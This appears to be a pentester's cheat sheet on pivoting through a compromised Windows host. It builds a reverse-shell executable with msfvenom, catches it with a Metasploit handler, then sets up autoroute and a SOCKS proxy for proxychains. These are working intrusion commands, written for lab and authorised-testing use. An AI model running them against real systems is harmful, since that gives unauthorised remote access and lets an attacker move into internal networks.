# Proxying with Metasploit 

## Pivoting with proxychains

### Setup

Get regular or meterpreter shell on target:
```bash
msfvenom -p windows/x64/$SHELL/reverse_tcp -f exe -o shell.exe LHOST=$IP LPORT=$LPORT
```
Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```


### Auto-Routing our Traffic

```msfconsole
use post/multi/manage/autoroute
set SESSION 1
set subnet $IP
exploit
```

## Setting up Proxy with Metasploit

Note: Depending on what version of Metasploit you are using, the Proxy Server module will be different. 
MSF5 and lower will have auxiliary/server/socks4a or socks5, MSF6 and newer will have socks/auxiliary/socks\_proxy. 
With MSF6, you will need to specify if you want to use SOCKS4(a) or SOCKS5.
```msfconsole
use auxiliary/server/socks4a
```
Configure proxychains
```bash
vim /etc/proxychains.conf
# comment lines that aren't required or you'll create a longer misconfigured chain
socks$4-5 127.0.0.1 $AUXILIARY-SERVER-PORT-NUMBER-GOES-HERE
```
